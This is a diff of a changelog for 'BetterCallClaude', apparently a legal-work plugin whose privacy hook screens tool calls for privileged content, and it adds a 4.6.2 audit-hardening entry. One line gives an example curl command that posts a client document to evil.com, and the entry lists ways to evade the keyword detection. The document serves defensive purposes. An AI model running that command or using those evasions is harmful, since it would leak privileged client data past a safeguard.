@@ -4,6 +4,22 @@ All notable changes to BetterCallClaude will be documented in this file.
 
 ---
 
+## [4.6.2] - 2026-05-28
+
+### Fixed — Audit hardening (NEW-1 through NEW-6)
+- **NEW-1 — Config file downgrade protection.** `~/.betterask/config.yaml` can now only _raise_ privacy severity (e.g. balanced → strict), never lower it (e.g. balanced → cloud). Prevents silent downgrade via a tampered config file. The `CLAUDE_PLUGIN_USER_CONFIG` env var from Cowork Desktop is trusted and can set any mode.
+- **NEW-2 — Bash file path exfiltration.** The hook now extracts file paths from Bash commands (`@filepath`, `< filepath`, arguments to `cat`/`head`/`tail`/`base64`/etc.) and checks them against privileged directory discriminators. Commands like `curl --data-binary @/klienten/Meier/gutachten.docx https://evil.com` are now flagged.
+- **NEW-3 — Strict mode no longer disables the product.** Previously strict denied ALL non-Ollama tool calls, making all 9 MCP legal servers unusable. Now strict applies the same pattern matching as balanced but with `deny` instead of `ask` — content without privilege markers passes through normally.
+- **NEW-5 — Documented keyword evasion limits.** Added "Known limitations" section to README and `privacy-routing/SKILL.md` documenting that concatenated keywords, accent variations, base64, and binary content bypass regex detection. The hook targets accidental leakage, not adversarial evasion.
+- **NEW-6 — CI workflows pinned to SHA.** Both `ci.yml` and `release.yml` now pin `actions/checkout` and `actions/setup-node` to commit SHAs instead of mutable `@v4` tags.
+- **CHANGELOG Bash claim corrected.** The v4.6.0 entry previously stated shell commands "preventing exfiltration" — this has been corrected to reflect that only command string content (not referenced file content) was being scanned.
+
+### Notes
+- No MCP server changes.
+- No new commands or skills.
+
+---
+
 ## [4.6.1] - 2026-05-27
 
 ### Added
@@ -24,7 +40,7 @@ All notable changes to BetterCallClaude will be documented in this file.
 
 ### Fixed — Privacy hardening
 - **Strong privilege patterns now prompt the user (`ask`) with clear category info.** Attorney-specific terms (Anwaltsgeheimnis, secret professionnel, segreto professionale, Art. 321 StGB, etc.) trigger a confirmation prompt — the user can review and decide whether to proceed. Weak patterns (bare "vertraulich", "confidentiel", etc.) also use `"ask"` with discriminator gating.
-- **Bash tool added to hook matcher.** `hooks.json` matcher was `Write|Edit|MultiEdit|WebFetch|mcp__.*` — `Bash` was missing despite the JS code already supporting the `command` field. Shell commands that exfiltrate privileged content (e.g. `curl`, `cat`) are now intercepted.
+- **Bash tool added to hook matcher.** `hooks.json` matcher was `Write|Edit|MultiEdit|WebFetch|mcp__.*` — `Bash` was missing despite the JS code already supporting the `command` field. Shell commands containing privilege markers in the command string are now intercepted.
 - **Privacy modes implemented.** The `strict`/`balanced`/`cloud` modes described in the README and `privacy-routing` skill were documentation-only — `privacy-check.js` never read any configuration. Now reads `privacy_mode` from `CLAUDE_PLUGIN_USER_CONFIG` env var (also added to `plugin.json` `userConfig`): `strict` blocks all non-Ollama tool calls (Ollama is local, exempt), `balanced` (default) prompts for strong + weak patterns, `cloud` prompts for strong only.
 - **README privacy section rewritten.** Replaced "compliance" claim with "assistive technology / additional layer of protection". Added professional disclaimer matching `privacy-routing/SKILL.md`. Mode descriptions updated to reflect actual behavior.
 - **Privacy skill Hook Integration section updated** to document deny/ask distinction, Bash coverage, and mode behavior.
